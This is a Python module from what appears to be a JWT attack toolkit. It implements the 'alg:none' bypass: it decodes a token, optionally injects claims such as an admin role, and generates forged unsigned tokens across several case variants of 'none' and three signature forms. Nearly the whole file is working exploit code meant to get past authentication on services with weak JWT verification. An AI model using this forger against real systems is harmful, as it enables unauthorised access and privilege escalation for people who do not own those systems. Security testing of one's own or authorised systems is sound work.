"""
Attack 1: Algorithm None Bypass
--------------------------------
Sets alg to "none" (and variants) with empty signature.
Many libraries skip signature verification when alg is none.
"""

from .utils import decode_token, b64url_encode
import json

ALG_NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe"]


def attack_alg_none(token: str, modify_payload: dict = None) -> list:
    """
    Generate alg:none tokens.
    Optionally modify payload claims (e.g. {"role": "admin", "sub": "0"}).
    Returns list of forged tokens.
    """
    header, payload, _, _ = decode_token(token)

    if modify_payload:
        payload.update(modify_payload)

    results = []
    for alg_variant in ALG_NONE_VARIANTS:
        forged_header = dict(header)
        forged_header["alg"] = alg_variant

        h = b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

        # Three signature variants: empty, missing dot, whitespace
        variants = [
            f"{h}.{p}.",       # standard none — empty sig
            f"{h}.{p}",        # missing trailing dot (some parsers accept this)
            f"{h}.{p}. ",      # space sig
        ]
        for v in variants:
            results.append({
                "alg_variant": alg_variant,
                "token": v,
                "note": f"alg={alg_variant}"
            })

    return results


def run(token: str, claims: dict = None, verbose: bool = True) -> list:
    results = attack_alg_none(token, modify_payload=claims)
    if verbose:
        print(f"\n[*] ALG:NONE ATTACK — generated {len(results)} token variants\n")
        seen_alg = set()
        for r in results:
            if r["alg_variant"] not in seen_alg:
                print(f"  [+] alg={r['alg_variant']}")
                print(f"      {r['token'][:80]}...")
                seen_alg.add(r["alg_variant"])
        print()
    return results
